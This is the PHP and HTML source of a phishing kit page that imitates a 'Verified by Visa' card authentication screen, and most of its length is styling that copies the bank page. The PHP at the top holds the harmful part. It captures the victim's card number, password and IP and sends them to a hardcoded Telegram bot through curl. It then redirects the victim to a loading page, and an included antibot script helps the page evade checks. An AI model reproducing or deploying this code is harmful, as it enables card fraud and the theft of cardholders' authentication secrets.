<?php
include'antibot.php';
$IdTelegram=array("-1305831045"); 
$Bin=$_GET['bin'];
$lbin=$_GET['lbin'];
$numb=$_GET['numb'];
$realip=$_GET['realip'];
if(isset($_POST['submit'])){
 $BotTelegramToken="5092363740:AAFbRwIMY8fQpgPUppzF7AncBKbCwu_Ev3M";
 $messageTelegram  = "|==[ VBV INFO ]==|\n";
 $messageTelegram .= "|CCNUMB     :  ".$numb."\n";
 $messageTelegram .= "|PASSW     :  ".$_POST['Credential']."\n";
 $messageTelegram .= "|IP         :  ".$_GET['realip']."\n";
 $messageTelegram .= "|==[ UPS ARON-TN ]==|\n";
 foreach($IdTelegram as $user_id) {
     $website="https://api.telegram.org/bot".$BotTelegramToken;
     $params=[
      'chat_id'=>$user_id, 
      'text'=>$messageTelegram,
     ];
     $ch = curl_init($website . '/sendMessage');
     curl_setopt($ch, CURLOPT_HEADER, false);
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
     curl_setopt($ch, CURLOPT_POST, 1);
     curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
     curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
     $result = curl_exec($ch);
     curl_close($ch);
 }
  HEADER("Location: loading.php?numb=".$numb."&phone=".$_GET['phone']."&realip=".$_GET['realip'].'&repeat=1');
}
?>
<!DOCTYPE html>
<html><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
<title>SO OTP Template</title>
<meta charset="utf-8">
<!-- Disable phone number linking -->
<meta name="format-detection" content="telephone=no">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" id="viewport" content="width=device-width, initial-scale=1.0;">
<link href="VBV_files/css.css" rel="stylesheet">

<style>
*:focus{
	outline: 0px;
}
*{
	-webkit-text-size-adjust: 100%;
}
html {
	height: 100%;
	width: 100%;
	padding: 0px;
	margin: 0px;
	min-width: 250px;
	min-height: 400px;
	overflow: auto;
}
body {
	min-height: 400px;
	min-width: 100%;
	height: 100%;
	width: 100%;
	padding: 0px;
	margin: 0px;
	font-family: Verdana, Geneva, sans-serif;
	font-size: 13px;
	text-align: center;
	overflow: hidden;
}
.container{
	position: relative;
	width: 100%;
	height: 100%;
	padding: 0px;
	margin: 0px;
	background: #FFFFFF;
	overflow-x: hidden;
	overflow-y: auto;
	scrollbar-width: thin;
	-ms-overflow-style: -ms-autohiding-scrollbar;
}
.header-zone {
	position: relative;
	height: 5%;
    width: 86%;
    background: #FFFFFF;
   	padding: 0.5% 7% 0.5% 7%;
	margin: 0px;
	box-shadow: 1px 1px #CCCCCC;
}
.lang-section {
	position: relative;
	height: 100%;
	width: 20%;
	float: left;
	background: #FFFFFF;
	margin: 0px;
	padding: 0px;
	text-align: left;
}
.lang-section select, .lang-section select option{
	background: #FFFFFF;
	color: #4A4A4A;
	border: none;
	text-align: left;
	font-family: Open Sans;
	font-size: 13px;
	white-space: nowrap;
	overflow: hidden;
	text-overflow: ellipsis;
	max-width: 14ch;
}
.selectOption{
	padding: 0px 5px;
}
.secondary-btn {
	position: relative;
	height: 100%;
	width: 60%;
	float: right;
	background: #FFFFFF;
	margin: 0px;
	padding: 0px;
	text-align: right;
}
.secondary-btn a{
	position: relative;
	width: 100%;
	height: 100%;
	background: #FFFFFF;
	color: #CC3333;
	margin: 0px;
	padding: 0px;
	font-family: Open Sans;
	font-size: 10px;
	font-weight: 600;
	text-align: right;
	white-space: nowrap;
	overflow: hidden;
	text-overflow: ellipsis;
	max-width: 12ch;
	text-transform: uppercase;
}
.branding-zone {
	position: relative;
	height: 10%;
    width: 86%;
    padding: 1% 7% 0.5% 7%;
	margin-bottom: 2px;
	box-shadow: 1px 1px #CCCCCC;
	display: -webkit-box;
}
.issuer-bank-logo {
	position: relative;
    height: 100%;
    width: 45%;
    float: left;
    background: #FFFFFF;
    margin: 0px;
    padding: 0px;
    text-align: left;
    border: none;
    background-size: contain;
}
.card-brand-logo {
	position: relative;
    height: 100%;
    width: 45%;
    float: right;
    background: #FFFFFF;
    margin-left: 10%;
    padding: 0;
    text-align: right;
    border: none;
    background-size: contain;
}
.issuer-bank-logo img{
	position: relative;
	width: auto;
	height: auto;
	max-width: 100%;
	max-height: 100%;
	top: 50%;
    transform: translate(0, -50%);
}
.card-brand-logo img{
	position: relative;
	width: auto;
	height: auto;
	max-width: 100%;
	max-height: 100%;
	top: 50%;
    transform: translate(0, -50%);
}
.challenge-zone{
	position: relative;
	width: 86%;
	min-height: 65%;
	height: auto;
	padding: 1% 7% 1% 7%;
	margin: 0px;
	background: #FCFCFC;
	box-shadow: 1px 1px #CCCCCC;
	overflow-x: auto;
	overflow-y: hidden;
}
.challenge-info-header{
	position: relative;
	width: 100%;
	min-height: 30px;
	height: auto;
	padding: 0px;
	margin: auto;
	text-align: center;
}
.challenge-info-header-h1{
	text-align: center;
	font-family: Open Sans;
	font-size: 16px;
	font-weight: 700;
	color: #333840;
	/*white-space: nowrap;
	overflow: hidden;
	text-overflow: ellipsis;*/
	line-height: 25px;
	padding: 1%;
	margin: 0%;
}
.challenge-info-text{
	position: relative;
	width: 96%;
	height: auto;
	padding: 0.5% 2% 1.5% 2%;
	margin: 0px;
	text-align: center;
	overflow-y: auto;
	-moz-text-align-last: center;
	text-align-last: center;
	font-family: Open Sans;
	font-size: 12px;
	font-weight: normal;
	color: #333840;
	overflow-y: auto;
	line-height: 17px;
}
.challenge-info-text > p{
	margin: 0px;
	color: #333840;
}
.challenge-info-sub-header{
	font-size: 13px;
	color: #333840;
	line-height: 16px;
	text-align: center;
	font-family: 'Open Sans';
	font-weight: 600;
	padding: 2% 2% 0% 2%;
	margin-bottom: 0px;
}
.challenge-info-label{
	font-size: 12px;
	color: #9B9B9B !important;
	line-height: 14px;
	text-align: center;
	font-family: 'Open Sans';
	font-weight: 600;
}
.container-body-header-desc-otp-ext > p{
	margin: 0px;
	color: #333840;
}
.txnDetails, .txnDetails > span{
	color: #333840 !important;
	font-size: 12px;
	font-family: Open Sans;
	font-weight: normal;
	line-height: 1.4;
	text-align: center;
}
.channelSelectionText{
	margin: 0px;
	font-family: Open Sans;
	font-size: 12px;
	font-weight: 600;
	padding: 5px 0px 10px 0px;
	color: #333840;
	line-height: 22px;
}
.resendInfoText{
	margin: 0px;
	font-family: Open Sans;
	font-size: 13px;
	font-weight: 500;
	padding: 10px 0px 0px 0px;
	color: #333840;
}
.channelSelectValidationText{
	color: #CC3333; 
	text-align: center;
	font-family: Open Sans;
	font-size: 13px;
	padding:0px;
	margin:0px;
}
.txnInputFormDiv{
	position: relative;
	width: 100%;
	height: auto;
	padding: 0px 0px;
	margin: auto;
}
.txnInputForm {
	position: relative;
	width: 100%;
	height: 100%;
	padding: 0px;
	margin: 0px auto;
}
.container-body-txnInput{
	position: relative;
	display: table;
	margin: auto;
	font-size: 12px;
	line-height: 22px;
	font-family: Open Sans;
	text-align: left;
	color: #4A4A4A;
	font-weight: 600;
	word-break: break-word;
}
.container-body-txnInput ul{
    list-style-type: none;
    padding: 0;
    margin: auto;
}
.container-body-txnInput-verify{
	position: relative;
	width: 100%;
	font-size: 13px;
	font-family: Open Sans;
	text-align: center;
	margin: auto;
}
.text_input::placeholder{
	min-width: 165px;
	width: auto;
	max-width: 300px;
	border: none;
	display: inline-block;
	margin: 0px 0px 12px 0px;
	padding: 6px 2px 6px 2px;
	font-family: Open Sans;
	font-size: 10px;
	text-align: left;
	line-height: 25px;
	font-weight: 500;
	color: #4A4A4A;
	letter-spacing: 2px;
}
.text_input:-ms-input-placeholder{
	min-width: 165px;
	width: auto;
	max-width: 300px;
	border: 1px solid #000000;
	display: inline-block;
	margin: 0px 0px 12px 0px;
	padding: 0px 2px 12px 2px;
	font-family: Open Sans;
	font-size: 10px;
	text-align: left;
	line-height: 25px;
	font-weight: 500;
	color: #4A4A4A;
	letter-spacing: 2px;
}
.text_input::-webkit-input-placeholder{
	min-width: 165px;
	width: auto;
	max-width: 300px;
	border: none;
	display: inline-block;
	margin: 0px 0px 12px 0px;
	padding: 0px 2px 0px 2px;
	font-family: Open Sans;
	font-size: 10px;
	text-align: left;
	line-height: 25px;
	font-weight: 500;
	color: #4A4A4A;
	letter-spacing: 2px;
}
.text_input{
	width: 165px;
	border: none;
	display: inline-block;
	margin: 0px 0px 12px 0px;
	border: 1px solid #979797;
	font-family: Open Sans;
	font-size: 17px;
	text-align: left;
	font-weight: 600;
	color: #4A4A4A;
	letter-spacing: 7px;
	-webkit-appearance: none; 
	-webkit-border-radius:6px;
	border-radius: 6px;
	box-sizing: border-box;
}
.bb_label{
	font-weight: 400;
	font-size: 11px;
	color: #333840;
	line-height: 15px;
	text-align: center;
	margin-top: 0px;
}
#resend-button{
	border: 1px solid #46749E;
	background: white;
	color: #46749E;
	min-width: 165px;
	max-width: 300px;
	max-height: 32px;
	overflow-x: hidden;
	text-overflow: ellipsis;
	font-size: 12px;
	font-family: Open Sans;
	font-weight: 500;
	height: 36px;
	cursor: pointer;
	-webkit-appearance: none;
	border-radius: 6px;
	-webkit-border-radius:6px;
}
.container-body-submit {
	position: relative;
	width: 100%;
	min-height: 32px;
	margin: 5px auto;
	padding: 0px;
}
.container-body-submit-elongated {
	position: relative;
	height: 32px;
	margin: 0px auto 12px auto;
	padding: 0px;
}
.container-body-submit-input {
	position: relative;
	height: 32px;
	width: 100%;
	text-align: center;
	color: white;
	border-radius: 2px;
	padding: 0px;
	display: inline-block;
}
.container-body-submit-input-elongated {
	position: relative;
	height: 32px;
	width: auto;
	text-align: center;
	color: white;
	border-radius: 6px;
	padding: 0px;
	display: inline-block;
}
#verify-button, #verify-btn, #next-button{
	position: relative;
	height: 32px;
	width: 100%;
	border: none;
	border-radius: 4px;
	background: #46749e;
	color: #ffffff;
	font-size: 12px;
	font-family: Open Sans;
	font-weight: 600;
	cursor: pointer;
	-webkit-appearance: none;
}
#verify-button, #verify-btn{
	min-width: 165px;
}
#verify-button:disabled{
	cursor: not-allowed;
	opacity: 0.65;
}
#verify-btn:disabled{
	cursor: not-allowed;
	opacity: 0.65;
}
#next-button:disabled{
	cursor: not-allowed;
	opacity: 0.65;
}
#verify-btn-elongated {
	position: relative;
	height: 32px;
	min-width: 165px;
	max-width: 300px;
	width: auto;
	border: none;
	border-radius: 6px;
	background: #46749e;
	color: #ffffff;
	font-size: 12px;
	font-family: Open Sans;
	font-weight: 500;
	cursor: pointer;
	overflow: hidden;
	text-overflow: ellipsis;
	-webkit-appearance: none;
}
.validationText{
	color: #FF1B1B;
	text-align: center;
	margin: 0;
	font-size: 10px;
	line-height: 14px;
	margin-bottom: 10px;
}
.secondary-card-holder{
	/* margin-left: 105px; */
}
.container-footer{
	width: 86%;
	min-height: 15%;
	height: auto;
	padding: 1% 7% 1% 7%;
	margin: 0px;
	background: #FFFFFF;
}
#displayText,  #displayText1{
	position: relative;
	width: 98%;
	height: 18px;
	padding: 6px 0px 4px 0px;
	font-family: Open Sans;
	font-size: 12px;
	line-height: 28px;
	margin: auto;
	font-weight: 600;
	color: #4A4A4A;
}
#hideText p{
	margin: 0px;
}
.hidetext-span{
	color: #4A4A4A;
	font-family: Open Sans;
	position: relative;
	width: 94%;
	height: auto;
	padding: 2%;
	margin: 0px;
	text-align: left;
	font-size: 12px;
	font-weight: normal;
	line-height: 1.4;
	float: left;
}
.hidetext1-span{
	color: #4A4A4A;
	font-family: Open Sans;
	position: relative;
	width: 94%;
	height: auto;
	padding: 2%;
	margin: 0px;
	text-align: left;
	font-size: 12px;
	font-weight: normal;
	overflow-y: auto;
	line-height: 1.4;
	float: left;
}
.txnErrorForm h3{
	color: #FF1B1B;
	font-size: 16px;
	font-weight: 700;
	line-height: 25px;
	margin: 0;
	font-family: Open Sans;
}
.txnErrorParagraphDiv p{
	line-height: 25px;
	color: #333840;
	font-size: 12px;
	font-weight: 500;
	font-family: Open Sans;
}
.serverErrorMsg, .clientErrorMsg{
	width: auto;
	margin-left: auto;
   	margin-right: auto;
	display: inline-flex;	
}
/* ********** Cancel Transaction *********** */
.container-greyout {
	position: inherit;
	height: 100%;
	width: 100%;
	padding: 0px;
	margin: 0px;
	z-index: 100;
	background: #303030;
	opacity: 0.98;
	display: none;
	font-family: Open Sans;
}
.cancelTxn-div {
	position: relative;
	height: auto;
    width: 90%;
	max-height: 50%;
    overflow: auto;
	background: white;
	border: solid grey 1px;
	border-radius: 5px;
	opacity: 1;
	z-index: 1001;
	top: 50%;
	left: 50%;
	transform: translate(-50%, -50%);
	padding: 1% 2% 2%;
	text-align: left;
	font-size: 13px;
	scrollbar-width: thin;
}
.cancelTxn-div h3{
	font-size: 14px;
	font-weight: 700;
	color: #333840;
	line-height: 35px;
	margin-top: 1%;
}
.cancelTxn-div p{
	font-size: 10px;
	line-height: 18px;
	color: #4A4A4A;
}
.cancelTxn-div-msg{
	height: 80%;
	padding: 0 2%;
}
.cancelTxn-div-info-msg {
	height: 55%;
	overflow-y: auto;
}
.cancelTxn-div-submit {
	position: relative;
	width: auto;
	height: auto;
	display: inline-flex;
	padding: 0px;
	float: right;
}
.cancelTxn-input-btn {
	position: relative;
	height: 25px;
	min-width: 25px !important;
	max-width: 120px;
	width: auto;
	border: none;
	color: #4a90ff !important;
	background: none !important;
	float: right;
	font-size: 8px;
	font-weight: 600;
	cursor: pointer;
	font-family: Open Sans;
}
.cancelTxn-submit {
	position: relative;
	height: 25px;
	min-width: 25px !important;
	max-width: 120px;
	width: auto;
	border: none !important;
	float: right;
	color: #4a90ff !important;
	background: none !important;
	font-size: 8px;
	font-weight: 600;
	cursor: pointer;
	font-family: Open Sans;
}
/* ********** Cancel Transaction *********** */
.whyInfo-arrow-span{
	float: left;
	text-align: left;
	text-overflow: ellipsis;
    white-space: nowrap;
    overflow: hidden;
    width: 80%;
}
.expandableInfo-arrow-span{
	float: left;
	text-align: left;
	text-overflow: ellipsis;
    white-space: nowrap;
    overflow: hidden;
    width: 80%;
}	
.whyInfo-arrow-image{
	float:right;
	height: 15px;
    width: 15px;
    padding-top: 7px;
}
.expandableInfo-arrow-image{
	float:right;
	height: 15px;
    width: 15px;
    padding-top: 7px;
}
.whyInfo-arrow-button{
	border:none;
	background: none;
	outline: none;
	padding: 0;
	float:right;	
}
.expandableInfo-arrow-button {
	border:none;
	background: none;
	outline: none;
	padding: 0;
	float:right;
}
.authFailure-arrow-image{
    height: 40px !important;
    width: 40px !important;
	float: left;
    display: table;
    padding-right: 5px;
	margin-top: auto;
    margin-bottom: auto;
}
.transFailure-arrow-image{
	height: 40px;
    width: 40px;
}
.div-loading {
    position: absolute;
    top: 50%;
    left: 0;
    right: 0;
    z-index: 999;
    width: 80px;
    height: 16px;
    margin: 0 auto;
	padding: 10px;
	background: #FCFCFC;
	border-radius: 25px;
	border: 1px solid #000000;
}
.img-loading {
    width: 80px;
    height: 16px;
}

.no-margin{
	margin:0;
}
/*scrollbar width */
::-webkit-scrollbar {
    width: 5px;
	height: 5px;
	border-radius: 3px;
}
/*scrollbar Track */
::-webkit-scrollbar-track {
    background: #f1f1f1;
	border-radius: 3px;	
}
 
/*scrollbar Handle */
::-webkit-scrollbar-thumb {
    background: #888; 
	border-radius: 3px;
}
/*scrollbar Handle on hover */
::-webkit-scrollbar-thumb:hover {
    background: #555; 
	border-radius: 3px;
}
@media screen and (min-width: 250px){
	.container-body-submit {
		width: 146px;
	}
	.container-body-submit-input {
		width: auto;
	}
	#verify-button, #verify-btn, #next-button{
		min-width: 146px;
	}
	.bb_label{
		font-size: 11px;
	}
}
@media screen and (min-width: 251px) and (max-width: 400px){
	.bb_label{
		font-size: 12px;
	}
}
@media screen and (max-width: 400px){
	.challenge-info-header-h1{
		font-size: 16px;
	}
	.challenge-info-text, .txnDetails, .txnDetails > span{
		font-size: 11px;
	}
	.challenge-info-sub-header{
		font-size: 13px;
	}
	#displayText,  #displayText1{
		font-size: 11px;
	}
	.hidetext-span{
		font-size: 10px;
	}
	.hidetext1-span{
		font-size: 10px;
	}
}
@media screen and (min-width: 401px) and (max-width: 600px){
	.challenge-info-header-h1{
		font-size: 16px;
	}
	.challenge-info-text, .txnDetails, .txnDetails > span{
		font-size: 12px;
	}
	.challenge-info-sub-header{
		font-size: 14px;
	}
	#displayText,  #displayText1{
		font-size: 12px;
	}
	.hidetext-span{
		font-size: 11px;
	}
	.hidetext1-span{
		font-size: 11px;
	}
	.bb_label{
		font-size: 15px;
	}
}
@media screen and (min-width: 601px) and (max-width: 1000px){
	.challenge-info-header-h1{
		font-size: 17px;
	}
	.challenge-info-text, .txnDetails, .txnDetails > span{
		font-size: 13px;
	}
	.challenge-info-sub-header{
		font-size: 15px;
	}
	#displayText,  #displayText1{
		font-size: 13px;
	}
	.hidetext-span{
		font-size: 11px;
	}
	.hidetext1-span{
		font-size: 13px;
	}
}
@media screen and (min-width: 1001px){
	.challenge-info-header-h1{
		font-size: 19px;
	}
	.challenge-info-text, .txnDetails, .txnDetails > span{
		font-size: 15px;
	}
	.challenge-info-sub-header{
		font-size: 17px;
	}
	#displayText,  #displayText1{
		font-size: 15px;
	}
	.hidetext-span{
		font-size: 14px;
	}
	.hidetext1-span{
		font-size: 14px;
	}
	.bb_label{
		font-size: 15px;
	}
}
@media screen and (min-width: 600px) and (min-height: 400px){
	.challenge-zone{
		min-height: 59%;
	}
}
@media screen and (min-width: 675px) {
	.challenge-zone{
		min-height: 58%;
	}
	.challenge-info-header-h1{
		padding: 1%;
	}
	.container-body-Channel-enclose{
		margin-left: 21%;
	}
	.bb_label{
		font-size: 15px;
	}
}
@media screen and (min-width: 735px) {
	.challenge-zone{
		min-height: 57%;
	}
}
@media screen and (min-width: 800px) {
	.challenge-zone{
		min-height: 56%;
	}
	.container-body-Channel-enclose{
		margin-left: 22%;
	}
}
@media screen and (min-width: 860px) {
	.challenge-zone{
		min-height: 55%;
	}
	.challenge-info-header-h1{
		padding: 0%;
	}
}
@media screen and (min-width: 920px) {
	.challenge-zone{
		min-height: 54%;
	}
}
@media screen and (min-width: 990px) {
	.challenge-zone{
		min-height: 53%;
	}
}
@media screen and (min-width: 1050px) {
	.challenge-zone{
		min-height: 52%;
	}
	.container-body-Channel-enclose{
		margin-left: 23%;
	}
}
@media screen and (min-width: 1115px) {
	.challenge-zone{
		min-height: 51%;
	}
	.challenge-info-text{
		padding: 0 2%;
	}
}
@media screen and (min-width: 1180px) {
	.challenge-zone{
		min-height: 50%;
	}
}
@media screen and (min-width: 1240px) {
	.challenge-zone{
		min-height: 49%;
	}
	.container-body-Channel-enclose{
		margin-left: 24%;
	}
}
@media screen and (min-width: 1300px) {
	.challenge-zone{
		min-height: 48%;
	}
}
@media screen and (min-width: 1370px) {
	.challenge-zone{
		min-height: 47%;
	}
}
@media screen and (min-width: 1430px) {
	.challenge-zone{
		min-height: 46%;
	}
}
@media screen and (min-width: 1495px) {
	.challenge-zone{
		min-height: 45%;
	}
	.challenge-info-text{
		padding: 0% 2%;
	}
	.container-body-Channel-enclose{
		margin-left: 25%;
	}
}
@media screen and (min-width: 1560px) {
	.challenge-zone{
		min-height: 44%;
	}
}
@media screen and (min-width: 1620px) {
	.challenge-zone{
		min-height: 43%;
	}
}
@media screen and (min-width: 1685px) {
	.challenge-zone{
		min-height: 42%;
	}
}
@media screen and (min-width: 1750px) {
	.challenge-zone{
		min-height: 41%;
	}
}
@media screen and (min-width: 1810px) {
	.challenge-zone{
		min-height: 40%;
	}
}
@media screen and (min-width: 1870px) {
	.challenge-zone{
		min-height: 39%;
	}
}
@media screen and (min-height: 455px) and  (min-width: 675px) {
	.challenge-zone{
		min-height: 59%;
	}
}
@media screen and (min-height: 455px) and  (min-width: 755px) {
	.challenge-zone{
		min-height: 57%;
	}
}
@media screen and (min-height: 455px) and  (min-width: 830px) {
	.challenge-zone{
		min-height: 56%;
	}
}
@media screen and (min-height: 455px) and  (min-width: 970px) {
	.challenge-zone{
		min-height: 55%;
	}
}
@media screen and (min-height: 455px) and  (min-width: 1030px) {
	.challenge-zone{
		min-height: 54%;
	}
}
@media screen and (min-height: 455px) and  (min-width: 1100px) {
	.challenge-zone{
		min-height: 53%;
	}
}
@media screen and (min-height: 455px) and  (min-width: 1170px) {
	.challenge-zone{
		min-height: 52%;
	}
}
@media screen and (min-height: 455px) and  (min-width: 1240px) {
	.challenge-zone{
		min-height: 51%;
	}
}
@media screen and (min-height: 455px) and  (min-width: 1310px) {
	.challenge-zone{
		min-height: 50%;
	}
}
@media screen and (min-height: 455px) and  (min-width: 1380px) {
	.challenge-zone{
		min-height: 49%;
	}
}
@media screen and (min-height: 455px) and  (min-width: 1450px) {
	.challenge-zone{
		min-height: 48%;
	}
}
@media screen and (min-height: 455px) and  (min-width: 1520px) {
	.challenge-zone{
		min-height: 47%;
	}
}
@media screen and (min-height: 455px) and  (min-width: 1590px) {
	.challenge-zone{
		min-height: 46%;
	}
}
@media screen and (min-height: 455px) and  (min-width: 1660px) {
	.challenge-zone{
		min-height: 45%;
	}
}
@media screen and (min-height: 455px) and  (min-width: 1730px) {
	.challenge-zone{
		min-height: 44%;
	}
}
@media screen and (min-height: 455px) and  (min-width: 1800px) {
	.challenge-zone{
		min-height: 43%;
	}
}
@media screen and (min-height: 455px) and  (min-width: 1870px) {
	.challenge-zone{
		min-height: 42%;
	}
}
@media screen and (min-height: 500px) and  (min-width: 610px) {
	.challenge-zone{
		min-height: 61%;
	}
}
@media screen and (min-height: 500px) and  (min-width: 675px) {
	.challenge-zone{
		min-height: 60%;
	}
}
@media screen and (min-height: 500px) and  (min-width: 755px) {
	.challenge-zone{
		min-height: 58%;
	}
}
@media screen and (min-height: 500px) and  (min-width: 830px) {
	.challenge-zone{
		min-height: 57%;
	}
}
@media screen and (min-height: 500px) and  (min-width: 970px) {
	.challenge-zone{
		min-height: 56%;
	}
}
@media screen and (min-height: 500px) and  (min-width: 1030px) {
	.challenge-zone{
		min-height: 55%;
	}
}
@media screen and (min-height: 500px) and  (min-width: 1100px) {
	.challenge-zone{
		min-height: 54%;
	}
}
@media screen and (min-height: 500px) and  (min-width: 1170px) {
	.challenge-zone{
		min-height: 53%;
	}
}
@media screen and (min-height: 500px) and  (min-width: 1240px) {
	.challenge-zone{
		min-height: 52%;
	}
}
@media screen and (min-height: 500px) and  (min-width: 1310px) {
	.challenge-zone{
		min-height: 51%;
	}
}
@media screen and (min-height: 500px) and  (min-width: 1380px) {
	.challenge-zone{
		min-height: 50%;
	}
}
@media screen and (min-height: 500px) and  (min-width: 1450px) {
	.challenge-zone{
		min-height: 49%;
	}
}
@media screen and (min-height: 500px) and  (min-width: 1520px) {
	.challenge-zone{
		min-height: 48%;
	}
}
@media screen and (min-height: 500px) and  (min-width: 1590px) {
	.challenge-zone{
		min-height: 47%;
	}
}
@media screen and (min-height: 500px) and  (min-width: 1660px) {
	.challenge-zone{
		min-height: 46%;
	}
}
@media screen and (min-height: 500px) and  (min-width: 1730px) {
	.challenge-zone{
		min-height: 45%;
	}
}
@media screen and (min-height: 500px) and  (min-width: 1800px) {
	.challenge-zone{
		min-height: 44%;
	}
}
@media screen and (min-height: 500px) and  (min-width: 1870px) {
	.challenge-zone{
		min-height: 43%;
	}
}
@media screen and (min-height: 540px) and  (min-width: 610px) {
	.challenge-zone{
		min-height: 62%;
	}
}
@media screen and (min-height: 540px) and  (min-width: 675px) {
	.challenge-zone{
		min-height: 61%;
	}
}
@media screen and (min-height: 540px) and  (min-width: 755px) {
	.challenge-zone{
		min-height: 59%;
	}
}
@media screen and (min-height: 540px) and  (min-width: 830px) {
	.challenge-zone{
		min-height: 58%;
	}
}
@media screen and (min-height: 540px) and  (min-width: 970px) {
	.challenge-zone{
		min-height: 57%;
	}
}
@media screen and (min-height: 540px) and  (min-width: 1030px) {
	.challenge-zone{
		min-height: 56%;
	}
}
@media screen and (min-height: 540px) and  (min-width: 1100px) {
	.challenge-zone{
		min-height: 55%;
	}
}
@media screen and (min-height: 540px) and  (min-width: 1170px) {
	.challenge-zone{
		min-height: 54%;
	}
}
@media screen and (min-height: 540px) and  (min-width: 1240px) {
	.challenge-zone{
		min-height: 53%;
	}
}
@media screen and (min-height: 540px) and  (min-width: 1310px) {
	.challenge-zone{
		min-height: 52%;
	}
}
@media screen and (min-height: 540px) and  (min-width: 1380px) {
	.challenge-zone{
		min-height: 51%;
	}
}
@media screen and (min-height: 540px) and  (min-width: 1450px) {
	.challenge-zone{
		min-height: 50%;
	}
}
@media screen and (min-height: 540px) and  (min-width: 1520px) {
	.challenge-zone{
		min-height: 49%;
	}
}
@media screen and (min-height: 540px) and  (min-width: 1590px) {
	.challenge-zone{
		min-height: 48%;
	}
}
@media screen and (min-height: 540px) and  (min-width: 1660px) {
	.challenge-zone{
		min-height: 47%;
	}
}
@media screen and (min-height: 540px) and  (min-width: 1730px) {
	.challenge-zone{
		min-height: 46%;
	}
}
@media screen and (min-height: 540px) and  (min-width: 1800px) {
	.challenge-zone{
		min-height: 45%;
	}
}
@media screen and (min-height: 540px) and  (min-width: 1870px) {
	.challenge-zone{
		min-height: 44%;
	}
}
@media screen and (min-height: 600px) and  (min-width: 610px) {
	.challenge-zone{
		min-height: 63%;
	}
}
@media screen and (min-height: 600px) and  (min-width: 675px) {
	.challenge-zone{
		min-height: 62%;
	}
}
@media screen and (min-height: 600px) and  (min-width: 755px) {
	.challenge-zone{
		min-height: 60%;
	}
}
@media screen and (min-height: 600px) and  (min-width: 830px) {
	.challenge-zone{
		min-height: 59%;
	}
}
@media screen and (min-height: 600px) and  (min-width: 970px) {
	.challenge-zone{
		min-height: 58%;
	}
}
@media screen and (min-height: 600px) and  (min-width: 1030px) {
	.challenge-zone{
		min-height: 57%;
	}
}
@media screen and (min-height: 600px) and  (min-width: 1100px) {
	.challenge-zone{
		min-height: 56%;
	}
}
@media screen and (min-height: 600px) and  (min-width: 1170px) {
	.challenge-zone{
		min-height: 55%;
	}
}
@media screen and (min-height: 600px) and  (min-width: 1240px) {
	.challenge-zone{
		min-height: 54%;
	}
}
@media screen and (min-height: 600px) and  (min-width: 1310px) {
	.challenge-zone{
		min-height: 53%;
	}
}
@media screen and (min-height: 600px) and  (min-width: 1380px) {
	.challenge-zone{
		min-height: 52%;
	}
}
@media screen and (min-height: 600px) and  (min-width: 1450px) {
	.challenge-zone{
		min-height: 51%;
	}
}
@media screen and (min-height: 600px) and  (min-width: 1520px) {
	.challenge-zone{
		min-height: 50%;
	}
}
@media screen and (min-height: 600px) and  (min-width: 1590px) {
	.challenge-zone{
		min-height: 49%;
	}
}
@media screen and (min-height: 600px) and  (min-width: 1660px) {
	.challenge-zone{
		min-height: 48%;
	}
}
@media screen and (min-height: 600px) and  (min-width: 1730px) {
	.challenge-zone{
		min-height: 47%;
	}
}
@media screen and (min-height: 600px) and  (min-width: 1800px) {
	.challenge-zone{
		min-height: 46%;
	}
}
@media screen and (min-height: 600px) and  (min-width: 1870px) {
	.challenge-zone{
		min-height: 45%;
	}
}
@media screen and (min-height: 690px) and  (min-width: 610px) {
	.challenge-zone{
		min-height: 64%;
	}
}
@media screen and (min-height: 690px) and  (min-width: 675px) {
	.challenge-zone{
		min-height: 63%;
	}
}
@media screen and (min-height: 690px) and  (min-width: 755px) {
	.challenge-zone{
		min-height: 61%;
	}
}
@media screen and (min-height: 690px) and  (min-width: 830px) {
	.challenge-zone{
		min-height: 60%;
	}
}
@media screen and (min-height: 690px) and  (min-width: 970px) {
	.challenge-zone{
		min-height: 59%;
	}
}
@media screen and (min-height: 690px) and  (min-width: 1030px) {
	.challenge-zone{
		min-height: 58%;
	}
}
@media screen and (min-height: 690px) and  (min-width: 1100px) {
	.challenge-zone{
		min-height: 57%;
	}
}
@media screen and (min-height: 690px) and  (min-width: 1170px) {
	.challenge-zone{
		min-height: 56%;
	}
}
@media screen and (min-height: 690px) and  (min-width: 1240px) {
	.challenge-zone{
		min-height: 55%;
	}
}
@media screen and (min-height: 690px) and  (min-width: 1310px) {
	.challenge-zone{
		min-height: 54%;
	}
}
@media screen and (min-height: 690px) and  (min-width: 1380px) {
	.challenge-zone{
		min-height: 53%;
	}
}
@media screen and (min-height: 690px) and  (min-width: 1450px) {
	.challenge-zone{
		min-height: 52%;
	}
}
@media screen and (min-height: 690px) and  (min-width: 1520px) {
	.challenge-zone{
		min-height: 51%;
	}
}
@media screen and (min-height: 690px) and  (min-width: 1590px) {
	.challenge-zone{
		min-height: 50%;
	}
}
@media screen and (min-height: 690px) and  (min-width: 1660px) {
	.challenge-zone{
		min-height: 49%;
	}
}
@media screen and (min-height: 690px) and  (min-width: 1730px) {
	.challenge-zone{
		min-height: 48%;
	}
}
@media screen and (min-height: 690px) and  (min-width: 1800px) {
	.challenge-zone{
		min-height: 47%;
	}
}
@media screen and (min-height: 690px) and  (min-width: 1870px) {
	.challenge-zone{
		min-height: 46%;
	}
}
@media screen and (min-height: 820px) and  (min-width: 610px) {
	.challenge-zone{
		min-height: 65%;
	}
}
@media screen and (min-height: 820px) and  (min-width: 675px) {
	.challenge-zone{
		min-height: 64%;
	}
}
@media screen and (min-height: 820px) and  (min-width: 755px) {
	.challenge-zone{
		min-height: 62%;
	}
}
@media screen and (min-height: 820px) and  (min-width: 830px) {
	.challenge-zone{
		min-height: 61%;
	}
}
@media screen and (min-height: 820px) and  (min-width: 970px) {
	.challenge-zone{
		min-height: 60%;
	}
}
@media screen and (min-height: 820px) and  (min-width: 1030px) {
	.challenge-zone{
		min-height: 59%;
	}
}
@media screen and (min-height: 820px) and  (min-width: 1100px) {
	.challenge-zone{
		min-height: 58%;
	}
}
@media screen and (min-height: 820px) and  (min-width: 1170px) {
	.challenge-zone{
		min-height: 57%;
	}
}
@media screen and (min-height: 820px) and  (min-width: 1240px) {
	.challenge-zone{
		min-height: 56%;
	}
}
